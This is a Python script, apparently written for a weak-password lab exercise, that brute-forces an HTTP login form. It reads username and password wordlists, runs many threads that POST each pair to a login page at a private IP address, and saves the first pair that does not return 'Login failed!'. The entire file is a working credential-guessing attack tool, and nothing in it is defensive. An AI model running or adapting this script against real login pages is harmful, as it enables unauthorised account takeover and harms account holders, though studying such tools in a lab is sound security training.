#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import threading
import requests

# 分块大小
BLOCK_SIZE = 1000


class ThreadWork:
        # 目标URL
        url = "http://192.168.123.124/WeakPassword/login.php"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 '
            '(KHTML, like Gecko) '
            'Chrome/19.0.1036.7 Safari/535.20'
        }
        # 类的构造函数
        def __init__(self,username,password):
            self.username = username
            self.password = password
        # 根据传入的帐户密码进行爆破
        def run(self,username,password):
            data = {
                    'username': username,
                    'password': password,
                    'submit': '%E7%99%BB%E5%BD%95'
            }
            # 显示正在尝试的数据
            print("username:{},password:{}".format(username,password))
            # 发送post请求
            response = requests.post(self.url,data=data,headers=self.headers)
            # 根据返回的内容中是否包含【登陆失败的提示】来判断是否登陆成功
            if 'Login failed!' in response.text:
                pass
            else:
                # 找到正确的帐户密码，就把帐户密码显示出来并输出到result文件中，并让程序终止
                print("success!!! username: {}, password: {}".format(username, password))
                resultFile = open('result','w')
                resultFile.write("success!!! username: {}, password: {}".format(username, password))
                resultFile.close()
                # 程序终止，0表示正常退出
                os._exit(0)
            # 从传递进来的帐户子块和密码子块中遍历数据
        def start(self):
            for userItem in self.username:
                for pwdItem in self.password:
                    # 传入帐户和密码数据进行爆破
                    self.run(userItem,pwdItem)

def BruteForceHttp():
    # 读取账号文件和密码文件并存入对应列表
    listUsername = [line.strip() for line in open("username")]
    listPassword = [line.strip() for line in open("passwords")]
    # 账号列表和密码列表进行分块处理
    blockUsername = partition(listUsername, BLOCK_SIZE)
    blockPassword = partition(listPassword, BLOCK_SIZE)
    threads = []
    # 把不同的密码子块分给不同的线程去爆破
    for sonUserBlock in blockUsername:
        for sonPwdBlock in blockPassword:
            # 传入账号子块和密码子块实例化任务
            work = ThreadWork(sonUserBlock,sonPwdBlock)
            # 创建线程
            workThread = threading.Thread(target=work.start)
            # 在threads中加入线程
            threads.append(workThread)
    # 开始子线程
    for t in threads:
        t.start()
    # 阻塞主线程，等待所有子线程完成工作
    for t in threads:
        t.join()


# 列表分块函数
def partition(ls, size):
    return [ls[i:i + size] for i in range(0, len(ls), size)]


if __name__ == '__main__':
    print("\n#####################################")
    print("#     WeakPassowrd experiment       #")
    print("#####################################\n")
                            
    BruteForceHttp()
